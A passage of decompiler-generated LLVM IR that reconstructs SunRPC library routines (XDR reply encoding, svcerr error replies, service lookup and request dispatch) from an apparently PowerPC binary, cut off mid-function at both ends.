dec_label_pc_1001052c:                            ; preds = %dec_label_pc_100104e0, %dec_label_pc_100104e8, %entry, %dec_label_pc_10010510
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_100104a4, { 1, 0 }
  uselistorder label %dec_label_pc_1001052c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_10010510, { 1, 0 }
}

define i32 @__GI_xdr_replymsg(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_10010544 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r31, align 4
  store i32 %arg1, i32* @r30, align 4
  store i32 268502368, i32* @lr, align 4
  %v0_1001055c = call i32 @xdr_u_long()
  %v3_10010564 = icmp eq i32 %v0_1001055c, 0
  %v0_10010568 = load i32, i32* @r30, align 4
  store i32 %v0_10010568, i32* @r3, align 4
  br i1 %v3_10010564, label %dec_label_pc_100105b4, label %dec_label_pc_10010570

dec_label_pc_10010570:                            ; preds = %entry
  store i32 268502388, i32* @lr, align 4
  %v0_10010570 = call i32 @xdr_enum()
  %v3_10010574 = icmp eq i32 %v0_10010570, 0
  br i1 %v3_10010574, label %dec_label_pc_100105b4, label %dec_label_pc_1001057c

dec_label_pc_1001057c:                            ; preds = %dec_label_pc_10010570
  %v0_1001057c = load i32, i32* @r31, align 4
  %v1_1001057c = add i32 %v0_1001057c, 4
  %v2_1001057c = inttoptr i32 %v1_1001057c to i32*
  %v3_1001057c = load i32, i32* %v2_1001057c, align 4
  %v3_1001058c = icmp eq i32 %v3_1001057c, 1
  br i1 %v3_1001058c, label %dec_label_pc_100105a0, label %dec_label_pc_100105b4

dec_label_pc_100105a0:                            ; preds = %dec_label_pc_1001057c
  %v1_10010594 = add i32 %v0_1001057c, 8
  %v1_10010588 = add i32 %v0_1001057c, 12
  %v0_10010584 = load i32, i32* @r30, align 4
  store i32 %v0_10010544, i32* @lr, align 4
  %v5_100105b0 = inttoptr i32 %v1_10010594 to i32*
  %v6_100105b0 = call i32 @xdr_union(i32 %v0_10010584, i32* %v5_100105b0, i32 %v1_10010588, i32 ptrtoint (i32* @global_var_10017364.406 to i32), i32 0)
  br label %dec_label_pc_100105b4

dec_label_pc_100105b4:                            ; preds = %dec_label_pc_1001057c, %dec_label_pc_10010570, %entry, %dec_label_pc_100105a0
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1001057c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100105b4, { 3, 0, 1, 2 }
}

define i32 @xdr_des_block() local_unnamed_addr {
entry:
  store i32 8, i32* @r5, align 4
  %v2_100105d0 = call i32 @xdr_opaque(i32* inttoptr (i32 8 to i32*))
  ret i32 %v2_100105d0
}

define i32 @xdr_opaque_auth() local_unnamed_addr {
entry:
  %v0_100105d4 = load i32, i32* @lr, align 4
  %v0_100105e0 = load i32, i32* @r4, align 4
  %v0_100105e8 = load i32, i32* @r3, align 4
  store i32 %v0_100105e8, i32* @r31, align 4
  store i32 268502512, i32* @lr, align 4
  %v0_100105ec = call i32 @xdr_enum()
  %v3_100105f4 = icmp eq i32 %v0_100105ec, 0
  br i1 %v3_100105f4, label %dec_label_pc_1001061c, label %dec_label_pc_10010604

dec_label_pc_10010604:                            ; preds = %entry
  %v1_100105f8 = add i32 %v0_100105e0, 4
  %v1_100105f0 = add i32 %v0_100105e0, 8
  %v0_10010608 = load i32, i32* @r31, align 4
  store i32 %v0_100105d4, i32* @lr, align 4
  %v4_10010618 = inttoptr i32 %v0_10010608 to i32*
  %v5_10010618 = call i32 @xdr_bytes(i32* %v4_10010618, i32 %v1_100105f8, i32 %v1_100105f0, i32 400)
  br label %dec_label_pc_1001061c

dec_label_pc_1001061c:                            ; preds = %entry, %dec_label_pc_10010604
  %v0_1001062c = phi i32 [ 0, %entry ], [ %v5_10010618, %dec_label_pc_10010604 ]
  ret i32 %v0_1001062c

; uselistorder directives
  uselistorder label %dec_label_pc_1001061c, { 1, 0 }
}

define i32 @__GI_xdr_accepted_reply(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_10010630 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r30, align 4
  store i32 268502604, i32* @lr, align 4
  %v0_10010648 = call i32 @xdr_opaque_auth()
  %v3_10010650 = icmp eq i32 %v0_10010648, 0
  %v0_10010654 = load i32, i32* @r30, align 4
  store i32 %v0_10010654, i32* @r3, align 4
  br i1 %v3_10010650, label %dec_label_pc_100106d4, label %dec_label_pc_1001065c

dec_label_pc_1001065c:                            ; preds = %entry
  store i32 268502624, i32* @lr, align 4
  %v0_1001065c = call i32 @xdr_enum()
  store i32 %v0_1001065c, i32* %r3.global-to-local, align 4
  %v3_10010660 = icmp eq i32 %v0_1001065c, 0
  br i1 %v3_10010660, label %dec_label_pc_100106d4, label %dec_label_pc_10010668

dec_label_pc_10010668:                            ; preds = %dec_label_pc_1001065c
  %v0_10010668 = load i32, i32* @r31, align 4
  %v1_10010668 = add i32 %v0_10010668, 12
  %v2_10010668 = inttoptr i32 %v1_10010668 to i32*
  %v3_10010668 = load i32, i32* %v2_10010668, align 4
  %v0_1001066c = load i32, i32* @r30, align 4
  store i32 %v0_1001066c, i32* %r3.global-to-local, align 4
  %v3_10010670 = icmp eq i32 %v3_10010668, 0
  br i1 %v3_10010670, label %dec_label_pc_10010688, label %dec_label_pc_10010680

dec_label_pc_10010680:                            ; preds = %dec_label_pc_10010668
  %v3_10010674 = icmp eq i32 %v3_10010668, 2
  br i1 %v3_10010674, label %dec_label_pc_100106a4, label %dec_label_pc_100106d8

dec_label_pc_10010688:                            ; preds = %dec_label_pc_10010668
  %v1_1001068c = add i32 %v0_10010668, 20
  %v2_1001068c = inttoptr i32 %v1_1001068c to i32*
  %v3_1001068c = load i32, i32* %v2_1001068c, align 4
  call void @__pseudo_call(i32 %v3_1001068c)
  %v0_1001069c = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100106d8

dec_label_pc_100106a4:                            ; preds = %dec_label_pc_10010680
  %v1_100106a4 = add i32 %v0_10010668, 16
  store i32 %v1_100106a4, i32* @r4, align 4
  store i32 %v0_1001066c, i32* @r3, align 4
  store i32 268502704, i32* @lr, align 4
  %v0_100106ac = call i32 @xdr_u_long()
  %v0_100106b0 = load i32, i32* @r31, align 4
  %v1_100106b0 = add i32 %v0_100106b0, 20
  store i32 %v1_100106b0, i32* @r4, align 4
  %v3_100106b4 = icmp eq i32 %v0_100106ac, 0
  %v0_100106b8 = load i32, i32* @r30, align 4
  store i32 %v0_100106b8, i32* @r3, align 4
  br i1 %v3_100106b4, label %dec_label_pc_100106d4, label %dec_label_pc_100106c0

dec_label_pc_100106c0:                            ; preds = %dec_label_pc_100106a4
  store i32 %v0_10010630, i32* @lr, align 4
  %v0_100106d0 = call i32 @xdr_u_long()
  store i32 %v0_100106d0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100106d4

dec_label_pc_100106d4:                            ; preds = %dec_label_pc_100106a4, %dec_label_pc_1001065c, %entry, %dec_label_pc_100106c0
  br label %dec_label_pc_100106d8

dec_label_pc_100106d8:                            ; preds = %dec_label_pc_10010680, %dec_label_pc_10010688, %dec_label_pc_100106d4
  %v0_100106d8 = phi i32 [ 1, %dec_label_pc_10010680 ], [ %v0_1001069c, %dec_label_pc_10010688 ], [ 0, %dec_label_pc_100106d4 ]
  store i32 %v0_100106d8, i32* %r3.global-to-local, align 4
  ret i32 %v0_100106d8

; uselistorder directives
  uselistorder i32 %v0_100106d8, { 1, 0 }
  uselistorder i32 %v0_10010668, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100106d8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100106d4, { 3, 0, 1, 2 }
}

define i32 @svc_sendreply(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_10010734 = add i32 %arg1, 8
  %v2_10010734 = inttoptr i32 %v1_10010734 to i32*
  %v3_10010734 = load i32, i32* %v2_10010734, align 4
  %v1_10010738 = add i32 %v3_10010734, 12
  %v2_10010738 = inttoptr i32 %v1_10010738 to i32*
  %v3_10010738 = load i32, i32* %v2_10010738, align 4
  call void @__pseudo_call(i32 %v3_10010738)
  ret i32 %arg1
}

define i32 @svcerr_noproc(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10010790 = add i32 %arg1, 8
  %v2_10010790 = inttoptr i32 %v1_10010790 to i32*
  %v3_10010790 = load i32, i32* %v2_10010790, align 4
  %v1_10010794 = add i32 %v3_10010790, 12
  %v2_10010794 = inttoptr i32 %v1_10010794 to i32*
  %v3_10010794 = load i32, i32* %v2_10010794, align 4
  call void @__pseudo_call(i32 %v3_10010794)
  ret i32 %arg1
}

define i32 @svcerr_decode(i32 %arg1) local_unnamed_addr {
entry:
  %v1_100107e8 = add i32 %arg1, 8
  %v2_100107e8 = inttoptr i32 %v1_100107e8 to i32*
  %v3_100107e8 = load i32, i32* %v2_100107e8, align 4
  %v1_100107ec = add i32 %v3_100107e8, 12
  %v2_100107ec = inttoptr i32 %v1_100107ec to i32*
  %v3_100107ec = load i32, i32* %v2_100107ec, align 4
  call void @__pseudo_call(i32 %v3_100107ec)
  ret i32 %arg1
}

define i32 @svcerr_systemerr(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10010840 = add i32 %arg1, 8
  %v2_10010840 = inttoptr i32 %v1_10010840 to i32*
  %v3_10010840 = load i32, i32* %v2_10010840, align 4
  %v1_10010844 = add i32 %v3_10010840, 12
  %v2_10010844 = inttoptr i32 %v1_10010844 to i32*
  %v3_10010844 = load i32, i32* %v2_10010844, align 4
  call void @__pseudo_call(i32 %v3_10010844)
  ret i32 %arg1
}

define i32 @svcerr_auth(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10010884 = add i32 %arg1, 8
  %v2_10010884 = inttoptr i32 %v1_10010884 to i32*
  %v3_10010884 = load i32, i32* %v2_10010884, align 4
  %v1_10010888 = add i32 %v3_10010884, 12
  %v2_10010888 = inttoptr i32 %v1_10010888 to i32*
  %v3_10010888 = load i32, i32* %v2_10010888, align 4
  call void @__pseudo_call(i32 %v3_10010888)
  ret i32 %arg1
}

define i32 @svcerr_weakauth() local_unnamed_addr {
entry:
  %v1_100108a8 = call i32 @svcerr_auth(i32 5)
  ret i32 %v1_100108a8
}

define i32 @__GI_svcerr_noprog(i32 %arg1) local_unnamed_addr {
entry:
  store i32 1, i32* @r10, align 4
  %v1_100108e0 = add i32 %arg1, 8
  %v2_100108e0 = inttoptr i32 %v1_100108e0 to i32*
  %v3_100108e0 = load i32, i32* %v2_100108e0, align 4
  %v1_100108e4 = add i32 %v3_100108e0, 12
  %v2_100108e4 = inttoptr i32 %v1_100108e4 to i32*
  %v3_100108e4 = load i32, i32* %v2_100108e4, align 4
  call void @__pseudo_call(i32 %v3_100108e4)
  ret i32 %arg1
}

define i32 @svcerr_progvers(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1001091c = load i32, i32* @r5, align 4
  store i32 %v0_1001091c, i32* @r29, align 4
  %v1_10010948 = add i32 %arg1, 8
  %v2_10010948 = inttoptr i32 %v1_10010948 to i32*
  %v3_10010948 = load i32, i32* %v2_10010948, align 4
  %v1_1001094c = add i32 %v3_10010948, 12
  %v2_1001094c = inttoptr i32 %v1_1001094c to i32*
  %v3_1001094c = load i32, i32* %v2_1001094c, align 4
  call void @__pseudo_call(i32 %v3_1001094c)
  ret i32 %arg1
}

define i32 @svc_find(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  %v0_10010980 = load i32, i32* @r4, align 4
  store i32 %v0_10010980, i32* @r31, align 4
  %v0_10010984 = load i32, i32* @r5, align 4
  store i32 %v0_10010984, i32* @r30, align 4
  store i32 268503436, i32* @lr, align 4
  %v0_10010988 = call i32 @__rpc_thread_variables()
  store i32 %v0_10010988, i32* %r3.global-to-local, align 4
  %v1_1001098c = add i32 %v0_10010988, 184
  %v2_1001098c = inttoptr i32 %v1_1001098c to i32*
  %v3_1001098c = load i32, i32* %v2_1001098c, align 4
  store i32 %v3_1001098c, i32* %r3.global-to-local, align 4
  %v3_100109b83 = icmp eq i32 %v3_1001098c, 0
  br i1 %v3_100109b83, label %dec_label_pc_100109c0, label %dec_label_pc_10010998.lr.ph

dec_label_pc_10010998.lr.ph:                      ; preds = %entry
  %v1_1001099c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10010998

dec_label_pc_10010998:                            ; preds = %dec_label_pc_10010998.lr.ph, %dec_label_pc_100109b0
  %v0_100109c06 = phi i32 [ 0, %dec_label_pc_10010998.lr.ph ], [ %v0_100109b0, %dec_label_pc_100109b0 ]
  %v0_100109b0 = phi i32 [ %v3_1001098c, %dec_label_pc_10010998.lr.ph ], [ %v2_100109b4, %dec_label_pc_100109b0 ]
  %v1_10010998 = add i32 %v0_100109b0, 4
  %v2_10010998 = inttoptr i32 %v1_10010998 to i32*
  %v3_10010998 = load i32, i32* %v2_10010998, align 4
  %v4_1001099c = icmp eq i32 %v3_10010998, %v1_1001099c.pre
  br i1 %v4_1001099c, label %dec_label_pc_100109a4, label %dec_label_pc_100109b0

dec_label_pc_100109a4:                            ; preds = %dec_label_pc_10010998
  %v1_100109a4 = add i32 %v0_100109b0, 8
  %v2_100109a4 = inttoptr i32 %v1_100109a4 to i32*
  %v3_100109a4 = load i32, i32* %v2_100109a4, align 4
  %v1_100109a8 = load i32, i32* @r31, align 4
  %v4_100109a8 = icmp eq i32 %v3_100109a4, %v1_100109a8
  br i1 %v4_100109a8, label %dec_label_pc_100109a4.dec_label_pc_100109c0_crit_edge, label %dec_label_pc_100109b0

dec_label_pc_100109b0:                            ; preds = %dec_label_pc_10010998, %dec_label_pc_100109a4
  %v1_100109b4 = inttoptr i32 %v0_100109b0 to i32*
  %v2_100109b4 = load i32, i32* %v1_100109b4, align 4
  store i32 %v2_100109b4, i32* %r3.global-to-local, align 4
  %v3_100109b8 = icmp eq i32 %v2_100109b4, 0
  br i1 %v3_100109b8, label %dec_label_pc_100109b8.dec_label_pc_100109c0_crit_edge, label %dec_label_pc_10010998

dec_label_pc_100109b8.dec_label_pc_100109c0_crit_edge: ; preds = %dec_label_pc_100109b0
  br label %dec_label_pc_100109c0

dec_label_pc_100109a4.dec_label_pc_100109c0_crit_edge: ; preds = %dec_label_pc_100109a4
  br label %dec_label_pc_100109c0

dec_label_pc_100109c0:                            ; preds = %dec_label_pc_100109a4.dec_label_pc_100109c0_crit_edge, %dec_label_pc_100109b8.dec_label_pc_100109c0_crit_edge, %entry
  %v0_100109c0 = phi i32 [ %v0_100109c06, %dec_label_pc_100109a4.dec_label_pc_100109c0_crit_edge ], [ %v0_100109b0, %dec_label_pc_100109b8.dec_label_pc_100109c0_crit_edge ], [ 0, %entry ]
  %v1_100109c0 = load i32, i32* @r30, align 4
  %v2_100109c0 = inttoptr i32 %v1_100109c0 to i32*
  store i32 %v0_100109c0, i32* %v2_100109c0, align 4
  %v0_100109d4 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100109d4

; uselistorder directives
  uselistorder i32 %v2_100109b4, { 1, 2, 0 }
  uselistorder i32 %v0_100109b0, { 0, 2, 3, 4, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 0 }
  uselistorder label %dec_label_pc_100109b0, { 1, 0 }
  uselistorder label %dec_label_pc_10010998, { 1, 0 }
}

define i32 @svc_getreq_common(i32 %arg1) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1304 = alloca i32, align 4
  %stack_var_-1292 = alloca i32, align 4
  %stack_var_-1248 = alloca i32, align 4
  %stack_var_-1272 = alloca i32, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 268503552, i32* @lr, align 4
  %v0_100109fc = call i32 @__rpc_thread_variables()
  %v1_10010a00 = add i32 %v0_100109fc, 180
  %v2_10010a00 = inttoptr i32 %v1_10010a00 to i32*
  %v3_10010a00 = load i32, i32* %v2_10010a00, align 4
  %v0_10010a04 = load i32, i32* @r29, align 4
  %v1_10010a04 = mul i32 %v0_10010a04, 4
  store i32 %v0_100109fc, i32* @r30, align 4
  %v2_10010a0c = add i32 %v1_10010a04, %v3_10010a00
  %v3_10010a0c = inttoptr i32 %v2_10010a0c to i32*
  %v4_10010a0c = load i32, i32* %v3_10010a0c, align 4
  store i32 %v4_10010a0c, i32* @r29, align 4
  %v3_10010a10 = icmp eq i32 %v4_10010a0c, 0
  br i1 %v3_10010a10, label %dec_label_pc_10010b88, label %dec_label_pc_10010a18.preheader

dec_label_pc_10010a18.preheader:                  ; preds = %entry
  %v2_10010a1c = ptrtoint i32* %stack_var_-1272 to i32
  %v2_10010a54 = ptrtoint i32* %stack_var_-1292 to i32
  %v2_10010b30 = ptrtoint i32* %stack_var_-1304 to i32
  br label %dec_label_pc_10010a18

dec_label_pc_10010a18:                            ; preds = %dec_label_pc_10010b80.dec_label_pc_10010a18_crit_edge, %dec_label_pc_10010a18.preheader
  %v0_10010a18 = phi i32 [ %v0_10010a18.pre, %dec_label_pc_10010b80.dec_label_pc_10010a18_crit_edge ], [ %v4_10010a0c, %dec_label_pc_10010a18.preheader ]
  %v1_10010a18 = add i32 %v0_10010a18, 8
  %v2_10010a18 = inttoptr i32 %v1_10010a18 to i32*
  %v3_10010a18 = load i32, i32* %v2_10010a18, align 4
  store i32 %v2_10010a1c, i32* @r31, align 4
  %v1_10010a28 = inttoptr i32 %v3_10010a18 to i32*
  %v2_10010a28 = load i32, i32* %v1_10010a28, align 4
  call void @__pseudo_call(i32 %v2_10010a28)
  %v3_10010a34 = icmp eq i32 %v0_10010a18, 0
  br i1 %v3_10010a34, label %dec_label_pc_10010b4c, label %dec_label_pc_10010a3c

dec_label_pc_10010a3c:                            ; preds = %dec_label_pc_10010a18
  %v3_10010a40 = load i32, i32* %stack_var_-1248, align 4
  store i32 %v3_10010a40, i32* %r10.global-to-local, align 4
  %v3_10010a50 = icmp eq i32 %v3_10010a40, 0
  %v0_10010a58 = load i32, i32* @r29, align 4
  br i1 %v3_10010a50, label %dec_label_pc_10010a7c, label %dec_label_pc_10010a94

dec_label_pc_10010a7c:                            ; preds = %dec_label_pc_10010a3c
  %v3_10010a80 = load i32, i32* @global_var_10030d10.393, align 4
  %v2_10010a84 = add i32 %v0_10010a58, 32
  %v3_10010a84 = inttoptr i32 %v2_10010a84 to i32*
  store i32 %v3_10010a80, i32* %v3_10010a84, align 4
  %v0_10010a8c = load i32, i32* %r10.global-to-local, align 4
  %v2_10010a8c = add i32 %v0_10010a58, 40
  %v3_10010a8c = inttoptr i32 %v2_10010a8c to i32*
  store i32 %v0_10010a8c, i32* %v3_10010a8c, align 4
  br label %dec_label_pc_10010ab8

dec_label_pc_10010a94:                            ; preds = %dec_label_pc_10010a3c
  store i32 268503712, i32* @lr, align 4
  %v3_10010a9c = call i32 @_authenticate(i32 %v2_10010b30, i32 %v2_10010a1c, i32 %v2_10010a54)
  %v3_10010aa0 = icmp eq i32 %v3_10010a9c, 0
  br i1 %v3_10010aa0, label %dec_label_pc_10010ab8, label %dec_label_pc_10010aa8

dec_label_pc_10010aa8:                            ; preds = %dec_label_pc_10010a94
  %v0_10010aac = load i32, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10010ab4.407 to i32), i32* @lr, align 4
  %v2_10010ab0 = call i32 @svcerr_auth(i32 %v0_10010aac)
  br label %dec_label_pc_10010b4c

dec_label_pc_10010ab8:                            ; preds = %dec_label_pc_10010a94, %dec_label_pc_10010a7c
  %v0_10010ab8 = load i32, i32* @r30, align 4
  %v1_10010ab8 = add i32 %v0_10010ab8, 184
  %v2_10010ab8 = inttoptr i32 %v1_10010ab8 to i32*
  %v3_10010ab8 = load i32, i32* %v2_10010ab8, align 4
  %v3_10010ac0 = load i32, i32* %stack_var_-1304, align 4
  store i32 %v3_10010ac0, i32* @r8, align 4
  store i32 0, i32* @r5, align 4
  store i32 %tmp20, i32* @r10, align 4
  %v3_10010b103 = icmp eq i32 %v3_10010ab8, 0
  br i1 %v3_10010b103, label %dec_label_pc_10010b18, label %dec_label_pc_10010ad4

dec_label_pc_10010ad4:                            ; preds = %dec_label_pc_10010ab8, %dec_label_pc_10010b0c
  %v0_10010b1815 = phi i32 [ %v0_10010b1814, %dec_label_pc_10010b0c ], [ 0, %dec_label_pc_10010ab8 ]
  %v1_10010af0 = phi i32 [ %v1_10010af013, %dec_label_pc_10010b0c ], [ 0, %dec_label_pc_10010ab8 ]
  %v0_10010aec = phi i32 [ %v0_10010aec10, %dec_label_pc_10010b0c ], [ -1, %dec_label_pc_10010ab8 ]
  %v0_10010b2c = phi i32 [ %v2_10010b0c, %dec_label_pc_10010b0c ], [ %v3_10010ab8, %dec_label_pc_10010ab8 ]
  %v1_10010ad4 = add i32 %v0_10010b2c, 4
  %v2_10010ad4 = inttoptr i32 %v1_10010ad4 to i32*
  %v3_10010ad4 = load i32, i32* %v2_10010ad4, align 4
  %v4_10010ad8 = icmp eq i32 %v3_10010ad4, %v3_10010ac0
  br i1 %v4_10010ad8, label %dec_label_pc_10010ae0, label %dec_label_pc_10010b0c

dec_label_pc_10010ae0:                            ; preds = %dec_label_pc_10010ad4
  %v1_10010ae0 = add i32 %v0_10010b2c, 8
  %v2_10010ae0 = inttoptr i32 %v1_10010ae0 to i32*
  %v3_10010ae0 = load i32, i32* %v2_10010ae0, align 4
  %v4_10010ae8 = icmp eq i32 %v3_10010ae0, %tmp20
  br i1 %v4_10010ae8, label %dec_label_pc_10010b2c, label %dec_label_pc_10010af8

dec_label_pc_10010af8:                            ; preds = %dec_label_pc_10010ae0
  %v3_10010aec = icmp ugt i32 %v0_10010aec, %v3_10010ae0
  br i1 %v3_10010aec, label %dec_label_pc_10010afc, label %dec_label_pc_10010b00

dec_label_pc_10010afc:                            ; preds = %dec_label_pc_10010af8
  br label %dec_label_pc_10010b00

dec_label_pc_10010b00:                            ; preds = %dec_label_pc_10010af8, %dec_label_pc_10010afc
  %v0_10010aec11 = phi i32 [ %v0_10010aec, %dec_label_pc_10010af8 ], [ %v3_10010ae0, %dec_label_pc_10010afc ]
  %tmp37 = icmp ugt i32 %v3_10010ae0, %v1_10010af0
  br i1 %tmp37, label %dec_label_pc_10010b04, label %dec_label_pc_10010b0c

dec_label_pc_10010b04:                            ; preds = %dec_label_pc_10010b00
  store i32 %v3_10010ae0, i32* @r5, align 4
  br label %dec_label_pc_10010b0c

dec_label_pc_10010b0c:                            ; preds = %dec_label_pc_10010b00, %dec_label_pc_10010ad4, %dec_label_pc_10010b04
  %v0_10010b1814 = phi i32 [ %v0_10010b1815, %dec_label_pc_10010ad4 ], [ 1, %dec_label_pc_10010b00 ], [ 1, %dec_label_pc_10010b04 ]
  %v1_10010af013 = phi i32 [ %v1_10010af0, %dec_label_pc_10010ad4 ], [ %v1_10010af0, %dec_label_pc_10010b00 ], [ %v3_10010ae0, %dec_label_pc_10010b04 ]
  %v0_10010aec10 = phi i32 [ %v0_10010aec, %dec_label_pc_10010ad4 ], [ %v0_10010aec11, %dec_label_pc_10010b00 ], [ %v0_10010aec11, %dec_label_pc_10010b04 ]
  %v1_10010b0c = inttoptr i32 %v0_10010b2c to i32*
  %v2_10010b0c = load i32, i32* %v1_10010b0c, align 4
  %v3_10010b10 = icmp eq i32 %v2_10010b0c, 0
  br i1 %v3_10010b10, label %dec_label_pc_10010b10.dec_label_pc_10010b18_crit_edge, label %dec_label_pc_10010ad4

dec_label_pc_10010b10.dec_label_pc_10010b18_crit_edge: ; preds = %dec_label_pc_10010b0c
  br label %dec_label_pc_10010b18

dec_label_pc_10010b18:                            ; preds = %dec_label_pc_10010b10.dec_label_pc_10010b18_crit_edge, %dec_label_pc_10010ab8
  %v0_10010b18 = phi i32 [ %v0_10010b1814, %dec_label_pc_10010b10.dec_label_pc_10010b18_crit_edge ], [ 0, %dec_label_pc_10010ab8 ]
  %v3_10010b18 = icmp eq i32 %v0_10010b18, 0
  %v0_10010b44 = load i32, i32* @r29, align 4
  br i1 %v3_10010b18, label %dec_label_pc_10010b44, label %dec_label_pc_10010b20

dec_label_pc_10010b20:                            ; preds = %dec_label_pc_10010b18
  store i32 ptrtoint (i32* @global_var_10010b28.408 to i32), i32* @lr, align 4
  %v1_10010b24 = call i32 @svcerr_progvers(i32 %v0_10010b44)
  br label %dec_label_pc_10010b4c

dec_label_pc_10010b2c:                            ; preds = %dec_label_pc_10010ae0
  %v1_10010b2c = add i32 %v0_10010b2c, 12
  %v2_10010b2c = inttoptr i32 %v1_10010b2c to i32*
  %v3_10010b2c = load i32, i32* %v2_10010b2c, align 4
  call void @__pseudo_call(i32 %v3_10010b2c)
  br label %dec_label_pc_10010b4c

dec_label_pc_10010b44:                            ; preds = %dec_label_pc_10010b18
  store i32 268503884, i32* @lr, align 4
  %v1_10010b48 = call i32 @__GI_svcerr_noprog(i32 %v0_10010b44)
  br label %dec_label_pc_10010b4c

dec_label_pc_10010b4c:                            ; preds = %dec_label_pc_10010a18, %dec_label_pc_10010b2c, %dec_label_pc_10010b20, %dec_label_pc_10010aa8, %dec_label_pc_10010b44
  %v0_10010b4c = load i32, i32* @r29, align 4
  %v1_10010b4c = add i32 %v0_10010b4c, 8
  %v2_10010b4c = inttoptr i32 %v1_10010b4c to i32*
  %v3_10010b4c = load i32, i32* %v2_10010b4c, align 4
  %v1_10010b54 = add i32 %v3_10010b4c, 4
  %v2_10010b54 = inttoptr i32 %v1_10010b54 to i32*
  %v3_10010b54 = load i32, i32* %v2_10010b54, align 4
  call void @__pseudo_call(i32 %v3_10010b54)
  %v3_10010b60 = icmp eq i32 %v0_10010b4c, 0
  br i1 %v3_10010b60, label %dec_label_pc_10010b68, label %dec_label_pc_10010b80

dec_label_pc_10010b68:                            ; preds = %dec_label_pc_10010b4c
  %v0_10010b68 = load i32, i32* @r29, align 4
  %v1_10010b68 = add i32 %v0_10010b68, 8
  %v2_10010b68 = inttoptr i32 %v1_10010b68 to i32*
  %v3_10010b68 = load i32, i32* %v2_10010b68, align 4
  %v1_10010b70 = add i32 %v3_10010b68, 20
  %v2_10010b70 = inttoptr i32 %v1_10010b70 to i32*
  %v3_10010b70 = load i32, i32* %v2_10010b70, align 4
  call void @__pseudo_call(i32 %v3_10010b70)
  br label %dec_label_pc_10010b88

dec_label_pc_10010b80:                            ; preds = %dec_label_pc_10010b4c
  %v3_10010b80 = icmp eq i32 %v0_10010b4c, 1
  br i1 %v3_10010b80, label %dec_label_pc_10010b80.dec_label_pc_10010a18_crit_edge, label %dec_label_pc_10010b88

dec_label_pc_10010b80.dec_label_pc_10010a18_crit_edge: ; preds = %dec_label_pc_10010b80
  %v0_10010a18.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10010a18

dec_label_pc_10010b88:                            ; preds = %dec_label_pc_10010b80, %entry, %dec_label_pc_10010b68
  %v0_10010b98 = phi i32 [ %v0_100109fc, %entry ], [ %v0_10010b68, %dec_label_pc_10010b68 ], [ %v0_10010b4c, %dec_label_pc_10010b80 ]
  ret i32 %v0_10010b98

; uselistorder directives
  uselistorder i32 %v0_10010b4c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_10010b44, { 1, 0 }
  uselistorder i32 %v2_10010b0c, { 1, 0 }
  uselistorder i32 %v3_10010ae0, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %v0_10010aec, { 2, 1, 0 }
  uselistorder i32 %v1_10010af0, { 1, 2, 0 }
  uselistorder i32 %v0_10010a58, { 1, 0 }
  uselistorder label %dec_label_pc_10010b88, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10010b4c, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10010b0c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10010b00, { 1, 0 }
  uselistorder label %dec_label_pc_10010ad4, { 1, 0 }
}

define i32 @svc_getreqset(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r29, align 4
  store i32 268503988, i32* @lr, align 4
  %v0_10010bb0 = call i32 @_rpc_dtablesize()
  store i32 %v0_10010bb0, i32* @r27, align 4
  store i32 0, i32* @r28, align 4
  %v2_10010bfc3 = icmp sgt i32 %v0_10010bb0, 0
  br i1 %v2_10010bfc3, label %dec_label_pc_10010bc0.lr.ph, label %dec_label_pc_10010c04

dec_label_pc_10010bc0.lr.ph:                      ; preds = %entry
  %v0_10010bc0.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10010bc0

dec_label_pc_10010bc0:                            ; preds = %dec_label_pc_10010bc0.lr.ph, %dec_label_pc_10010bf4
  %v0_10010bc0 = phi i32 [ %v0_10010bc0.pre, %dec_label_pc_10010bc0.lr.ph ], [ %v1_10010bf4, %dec_label_pc_10010bf4 ]
  %v1_10010bc0 = inttoptr i32 %v0_10010bc0 to i32*
  %v2_10010bc0 = load i32, i32* %v1_10010bc0, align 4
  store i32 %v2_10010bc0, i32* @r31, align 4
  %v1_10010be011 = call i32 @ffs(i32 %v2_10010bc0)
  %v3_10010be412 = icmp eq i32 %v1_10010be011, 0
  %v0_10010be813 = load i32, i32* @r28, align 4
  %v2_10010be814 = add i32 %v1_10010be011, -1
  %v1_10010bec15 = add i32 %v2_10010be814, %v0_10010be813
  br i1 %v3_10010be412, label %dec_label_pc_10010bf4, label %dec_label_pc_10010bc8

